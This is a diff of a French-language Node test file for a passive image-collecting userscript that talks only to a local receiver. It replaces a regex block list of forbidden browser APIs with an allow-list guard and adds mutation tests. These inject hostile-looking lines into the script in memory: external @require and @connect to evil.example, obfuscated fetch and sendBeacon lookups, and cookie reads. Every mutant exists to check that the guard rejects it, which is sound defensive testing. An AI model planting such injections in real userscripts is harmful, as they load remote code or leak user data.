@@ -1,10 +1,12 @@
-// node test-userscript-collectorviper.js — le userscript PASSIF de Collectorviper (userscript-collectorviper.js). Test STATIQUE (aucun @connect autre que 127.0.0.1, aucun fetch,
-// aucun XMLHttpRequest, aucune création d'image, aucun rechargement, aucune navigation, aucun défilement, aucun cookie) et test de COMPORTEMENT dans un bac `vm` sur un DOM
-// FABRIQUÉ : aucune requête réelle.
+// node test-userscript-collectorviper.js — le userscript PASSIF de Collectorviper (userscript-collectorviper.js).
+//  · STATIQUE : la garde (collecte-cartes/garde-userscript-passif.js) est écrite par ce qu'elle AUTORISE — liste fermée de directives d'en-tête, chaînes sans hôte ni URL hors
+//    127.0.0.1, écritures / méthodes / `new` / createElement d'ensembles fermés — et on la fait dire NON sur des mutants du texte, en mémoire.
+//  · COMPORTEMENT : dans un bac `vm` sur un DOM FABRIQUÉ, aucune requête réelle.
 const fs = require('fs');
 const path = require('path');
 const vm = require('vm');
 const R = require('./recepteur-collectorviper');
+const G = require('./collecte-cartes/garde-userscript-passif');
 const { LARGEUR_MIN } = require('./collecte-cartes/seuils-images');
 
 let ok = 0, ko = 0;
@@ -17,58 +19,95 @@ const SRC = fs.readFileSync(process.env.CV_USERSCRIPT ? path.resolve(process.env
 const m = /^\/\/ ==UserScript==\r?\n([\s\S]*?)\r?\n\/\/ ==\/UserScript==/.exec(SRC);
 verifier('l\'en-tête ==UserScript== existe', !!m, true);
 const entete = m ? m[1] : '';
-const valeurs = cle => [...entete.matchAll(new RegExp(`^//\\s*@${cle}\\s+(.+?)\\s*$`, 'gm'))].map(x => x[1]);
 const code = SRC.slice(m ? m[0].length : 0);
 const sansCommentaires = code.replace(/\/\*[\s\S]*?\*\//g, '').replace(/(^|[^:\\'"`])\/\/[^\n]*/g, '$1');
 
-// ── STATIQUE : ce que le script AUTORISE
-verifier('@version : 1.0', valeurs('version'), ['1.0']);
-verifier('@match : la page supposée de Collectorviper, rien d\'autre', valeurs('match'), ['https://collectorviper.livejournal.com/*']);
-verifier('l\'en-tête dit que le @match est une SUPPOSITION (aucune requête ne l\'a vérifié)', /SUPPOSITION/.test(entete + code.slice(0, 3000)), true);
-verifier('@grant : GM_xmlhttpRequest seulement', valeurs('grant'), ['GM_xmlhttpRequest']);
-verifier('@connect : 127.0.0.1 seulement — aucun autre hôte, jamais « * »', valeurs('connect'), ['127.0.0.1']);
-const adresses = [...sansCommentaires.matchAll(/\b[a-z][a-z0-9+.-]*:\/\/[^\s'"`)]*/gi)].map(x => x[0]);
-verifier('dans le code : toute adresse écrite est http://127.0.0.1:<port> (aucun hôte d\'images, aucun LiveJournal)', adresses.length >= 1 && adresses.every(a => /^http:\/\/127\.0\.0\.1:$/.test(a)), true);
+// ── STATIQUE : le texte livré est TOUT dans l'ensemble admis
+verifier('GARDE : le userscript livré n\'a aucune violation', G.violations(SRC), []);
+verifier('@match : la page supposée de Collectorviper, rien d\'autre', G.MATCH, 'https://collectorviper.livejournal.com/*');
+verifier('l\'en-tête dit que le @match est une SUPPOSITION (aucune requête ne l\'a vérifié)', /SUPPOSITION/.test(SRC.slice(0, 3500)), true);
 const PORT_US = /^\s*var PORT = (\d{4,5});/m.exec(code);
 verifier('PORT : constante unique, égale au port par défaut du récepteur', [!!PORT_US, Number(PORT_US?.[1]) === R.PORT_DEFAUT], [true, true]);
 const ENTETE_US = /'X-Rat-Market':\s*'([^']+)'/.exec(code);
 verifier('l\'en-tête fixe du script est celui que le récepteur exige', [R.ENTETE_MARQUE, ENTETE_US?.[1]], ['x-rat-market', R.VALEUR_MARQUE]);
-verifier('le script ne pose PAS d\'en-tête Origin', /['"]Origin['"]/i.test(sansCommentaires), false);
-const hotes = [...sansCommentaires.matchAll(/['"]([a-z0-9-]+(?:\.[a-z0-9-]+)+)['"]/gi)].map(x => x[1]).filter(h => /\.(com|cn|net|org|fr|jp)$/i.test(h));
-verifier('seul nom d\'hôte écrit dans le code exécutable : celui de la page attendue (garde de lieu)', hotes, ['collectorviper.livejournal.com']);
 const num = nom => { const r = new RegExp(`var ${nom} = ([^;]+);`).exec(code); return r ? Function(`return (${r[1]})`)() : null; };
 verifier('SEUIL_LARGEUR : le seuil du dépôt (collecte-cartes/seuils-images.js), pas un autre nombre', num('SEUIL_LARGEUR'), LARGEUR_MIN);
 verifier('IMAGES_MAX du script ≤ celui du récepteur', num('IMAGES_MAX') > 0 && num('IMAGES_MAX') <= R.IMAGES_MAX, true);
 verifier('IMAGE_OCTETS_MAX du script ≤ celui du récepteur', num('IMAGE_OCTETS_MAX') > 0 && num('IMAGE_OCTETS_MAX') <= R.IMAGE_OCTETS_MAX, true);
-const interdits = [
-    ['fetch (même « avec garde de cache » : la voie cache n\'est pas gardée)', /\bfetch\s*\(/], ['XMLHttpRequest', /XMLHttpRequest/], ['sendBeacon', /sendBeacon/], ['new Request', /new\s+Request\b/], ['importScripts / import()', /importScripts|\bimport\s*\(/],
-    ['location.href =', /location\s*\.\s*href\s*=[^=]/], ['location.assign/replace', /location\s*\.\s*(assign|replace)\s*\(/], ['location = ', /\blocation\s*=[^=]/],
-    ['.click()', /\.\s*click\s*\(/], ['window.open', /window\s*\.\s*open\s*\(/],
-    ['cookie (document.cookie, GM_cookie, en-tête)', /cookie/i], ['localStorage/sessionStorage/indexedDB', /localStorage|sessionStorage|indexedDB/], ['GM_getValue/GM_setValue/GM_openInTab/GM_download', /GM_(getValue|setValue|cookie|openInTab|download)/],
-    ['new Image / WebSocket / EventSource', /new\s+(Image|WebSocket|EventSource)\b/], ['dispatchEvent', /dispatchEvent/],
-    ['createElement(img/link/script/iframe) : aucune ressource ne se crée', /createElement\s*\(\s*['"](img|image|link|script|iframe|video|audio|source|object|embed)['"]/i],
-    ['crossOrigin (le poser fait RECHARGER l\'image : une requête)', /crossOrigin|referrerPolicy/i],
-    ['changer le src / srcset d\'une image de la page', /\.\s*src(set)?\s*=[^=]|setAttribute\s*\(\s*['"]src/],
-    ['forcer le chargement paresseux', /\.\s*loading\s*=|setAttribute\s*\(\s*['"]loading|\.decode\s*\(/],
-    ['insertAdjacentHTML / document.write / outerHTML =', /insertAdjacentHTML|document\s*\.\s*write\s*\(|outerHTML\s*=[^=]/],
-    ['setTimeout / setInterval (aucune action différée ni répétée)', /\bset(Timeout|Interval)\s*\(/], ['MutationObserver / IntersectionObserver', /(Mutation|Intersection)Observer/], ['eval / Function', /\beval\s*\(|new\s+Function\b/],
-    ['AUCUN DÉFILEMENT', /\bscroll(To|By|IntoView|Top)?\s*[(=]|requestAnimationFrame|\.focus\s*\(/],
-    ['toBlob / createObjectURL / FileReader (autres voies de lecture)', /toBlob|createObjectURL|FileReader|ImageBitmap|createImageBitmap/]
-];
-for (const [nom, re] of interdits) verifier(`interdit absent : ${nom}`, re.test(sansCommentaires), false);
-verifier('GM_xmlhttpRequest est appelé UNE seule fois (poster, vers le récepteur)', (sansCommentaires.match(/GM_xmlhttpRequest\s*\(/g) || []).length, 1);
 verifier('redirections refusées sur le POST local', /redirect: 'error'/.test(sansCommentaires), true);
 verifier('la seule lecture d\'octets : le canvas des pixels AFFICHÉS (drawImage + toDataURL, chacun une fois)', [(sansCommentaires.match(/\.drawImage\s*\(/g) || []).length, (sansCommentaires.match(/\.toDataURL\s*\(/g) || []).length], [1, 1]);
-verifier('innerHTML : une seule affectation, sur panneau', [(sansCommentaires.match(/innerHTML/g) || []).length, /(?<![\w$.])panneau\s*\.\s*innerHTML\s*=(?!=)/.test(sansCommentaires)], [1, true]);
+verifier('le panneau se construit par l\'API DOM : aucun innerHTML ni insertAdjacentHTML', /innerHTML|insertAdjacentHTML/.test(sansCommentaires), false);
 verifier('un seul addEventListener (le clic)', (sansCommentaires.match(/addEventListener\s*\(/g) || []).length, 1);
+
+// la garde sait dire NON : chaque mutant du texte est refusé (en mémoire, rien d'écrit)
+const apresPort = charge => SRC.replace('var PORT = 8767;', 'var PORT = 8767;\n' + charge);
+const dansEntete = ligne => SRC.replace('// @noframes', '// @noframes\n' + ligne);
+const mutants = [
+    ['en-tête : @require externe', dansEntete('// @require      https://evil.example/x.js')],
+    ['en-tête : @require sans schéma', dansEntete('// @require      //evil.example/x.js')],
+    ['en-tête : @resource', dansEntete('// @resource     css https://evil.example/a.css')],
+    ['en-tête : @icon', dansEntete('// @icon         https://evil.example/i.png')],
+    ['en-tête : @updateURL', dansEntete('// @updateURL    https://evil.example/u.js')],
+    ['en-tête : @downloadURL', dansEntete('// @downloadURL  https://evil.example/d.js')],
+    ['en-tête : directive inconnue (@unwrap)', dansEntete('// @unwrap')],
+    ['en-tête : second @connect', dansEntete('// @connect      evil.example')],
+    ['en-tête : @connect *', SRC.replace('// @connect      127.0.0.1', '// @connect      *')],
+    ['en-tête : second @match', dansEntete('// @match        https://evil.example/*')],
+    ['en-tête : @grant GM_download', SRC.replace('// @grant        GM_xmlhttpRequest', '// @grant        GM_xmlhttpRequest\n// @grant        GM_download')],
+    ['en-tête : ligne qui n\'est pas une directive', dansEntete('// https://evil.example/ordre')],
+    ['corps : <img src="//hôte"> dans un innerHTML', apresPort('document.body.innerHTML = \'<img src="//evil.example/p.png">\';')],
+    ['corps : <link href="//hôte">', apresPort('var l = \'<link rel="stylesheet" href="//evil.example/a.css">\';')],
+    ['corps : src sans schéma ni double barre (evil.example/p.png)', apresPort('var l = \'x src="evil.example/p.png"\';')],
+    ['corps : url(//hôte) dans du CSS', apresPort('var c = \'background:url(//evil.example/a.png)\';')],
+    ['corps : url() dans du CSS avec un hôte entre guillemets', apresPort('var c = \'background:url("evil.example/a.png")\';')],
+    ['corps : propriété CSS hors liste (behavior)', apresPort('var c = \'behavior:red;\';')],
+    ['corps : adresse https écrite', apresPort('var u = \'https://evil.example/x\';')],
+    ['corps : adresse sans schéma, chemin', apresPort('var u = \'evil.example/x\';')],
+    ['corps : gabarit de chaîne', apresPort('var u = `//evil.example/${PORT}`;')],
+    ['corps : fetch', apresPort('var f = fetch(\'http://127.0.0.1:1/\');')],
+    ['corps : XMLHttpRequest', apresPort('var x = new XMLHttpRequest();')],
+    ['corps : new Audio', apresPort('var a = new Audio(\'x\');')],
+    ['corps : new Worker', apresPort('var a = new Worker(\'x\');')],
+    ['corps : new Image', apresPort('var a = new Image();')],
+    ['corps : navigator[\'send\'+\'Beacon\']', apresPort('var b = navigator[\'send\' + \'Beacon\'];')],
+    ['corps : sendBeacon', apresPort('document.sendBeacon(\'x\');')],
+    ['corps : window[\'fe\'+\'tch\']', apresPort('var w = window[\'fe\' + \'tch\'];')],
+    ['corps : accès indexé calculé sur document', apresPort('var d = document[PORT + 1];')],
+    ['corps : GM.xmlHttpRequest', apresPort('GM.xmlHttpRequest({});')],
+    ['corps : un second GM_xmlhttpRequest', apresPort('GM_xmlhttpRequest({});')],
+    ['corps : GM_download', apresPort('GM_download(\'x\');')],
+    ['corps : img[\'src\'] = …', apresPort('document[\'q\'] = 1; var i = document.createElement(\'canvas\'); i[\'src\'] = \'x\';')],
+    ['corps : img.src = …', apresPort('var i = document.createElement(\'canvas\'); i.src = PORT;')],
+    ['corps : .href = …', apresPort('var i = document.createElement(\'canvas\'); i.href = PORT;')],
+    ['corps : crossOrigin', apresPort('var i = document.createElement(\'canvas\'); i.crossOrigin = PORT;')],
+    ['corps : innerHTML', apresPort('var i = document.createElement(\'div\'); i.innerHTML = PORT;')],
+    ['corps : setAttribute', apresPort('var i = document.createElement(\'div\'); i.setAttribute(PORT, PORT);')],
+    ['corps : createElement(\'img\')', apresPort('var i = document.createElement(\'img\');')],
+    ['corps : createElement(\'script\')', apresPort('var i = document.createElement(\'script\');')],
+    ['corps : createElement(variable)', apresPort('var i = document.createElement(PORT);')],
+    ['corps : location = …', apresPort('location = PORT;')],
+    ['corps : location.href = …', apresPort('location.href = PORT;')],
+    ['corps : window.open', apresPort('window.open(PORT);')],
+    ['corps : eval', apresPort('eval(PORT);')],
+    ['corps : setTimeout', apresPort('setTimeout(function () {}, 1);')],
+    ['corps : document.cookie', apresPort('var c = document.cookie;')],
+    ['corps : .click()', apresPort('document.createElement(\'div\').click();')],
+    ['corps : fonction non déclarée appelée par un nom nu', apresPort('quelqueChose(PORT);')],
+    ['corps : méthode hors liste (.postMessage)', apresPort('document.postMessage(PORT);')]
+];
+for (const [nom, texteMute] of mutants) {
+    const v = G.violations(texteMute);
+    verifier(`la garde REFUSE : ${nom}`, v.length > 0, true);
+}
+verifier('contrôle du banc : un texte sans mutation reste admis (la garde ne refuse pas tout)', G.violations(apresPort('')), []);
+verifier('contrôle du banc : une ligne d\'en-tête admise répétée est refusée (chaque clé une fois)', G.violations(dansEntete('// @version      1.0')).length > 0, true);
 
 // ── COMPORTEMENT, dans un bac vm, sur un DOM fabriqué
 const SIG = Buffer.from('89504e470d0a1a0a', 'hex');
 const b64 = (n = 1) => Buffer.concat([SIG, Buffer.alloc(30, n)]).toString('base64');
 const el = (o = {}) => ({
     textContent: '', style: {}, children: [], ecouteurs: {}, tagName: 'DIV', parentElement: null, previousElementSibling: null,
-    addEventListener(t, f) { this.ecouteurs[t] = f; }, appendChild(c) { this.children.push(c); return c; }, setAttribute() { },
-    querySelector(s) { if (/^#rm-[a-z]+$/.test(s)) { this._ids = this._ids || {}; return this._ids[s] || (this._ids[s] = el()); } return null; },
+    addEventListener(t, f) { this.ecouteurs[t] = f; }, appendChild(c) { this.children.push(c); return c; },
     ...o
 });
 // une image de la page : lisible, protégée (canvas contaminé), petite, ou pas chargée
@@ -112,8 +151,8 @@ function fabriquerMonde({ images = [image(1)], reponses = null, erreur = null, h
 }
 const attendre = ms => new Promise(r => setTimeout(r, ms));
 const lancer = w => vm.runInNewContext(SRC, w.bac, { filename: 'userscript-collectorviper.js' });
-const texte = w => w.elements.map(e => e.textContent).join(' | ') + ' | ' + w.elements.flatMap(e => Object.values(e._ids || {})).map(e => e.textContent).join(' | ');
-const bouton = w => { for (const e of w.elements) for (const c of Object.values(e._ids || {})) if (c.ecouteurs.click) return c; return null; };
+const texte = w => w.elements.map(e => e.textContent).join(' | ');
+const bouton = w => w.elements.find(e => e.tag === 'button' && e.ecouteurs.click) || null;
 const cliquer = async w => { bouton(w).ecouteurs.click({}); await attendre(80); };
 const corps = w => w.appels.map(a => JSON.parse(a.data));
 
@@ -122,6 +161,7 @@ const corps = w => w.appels.map(a => JSON.parse(a.data));
     let w = fabriquerMonde();
     lancer(w);
     verifier('au chargement : un bouton, AUCUNE requête, AUCUN canvas créé, aucune image dessinée', [!!bouton(w), w.appels.length, w.acces.canvasCrees, w.acces.dessinees.length], [true, 0, 0, 0]);
+    verifier('le panneau est fait d\'éléments div et button seulement', [...new Set(w.elements.map(e => e.tag))].sort(), ['button', 'div']);
     await attendre(40);
     verifier('… toujours rien après attente', [w.appels.length, w.acces.canvasCrees], [0, 0]);
 
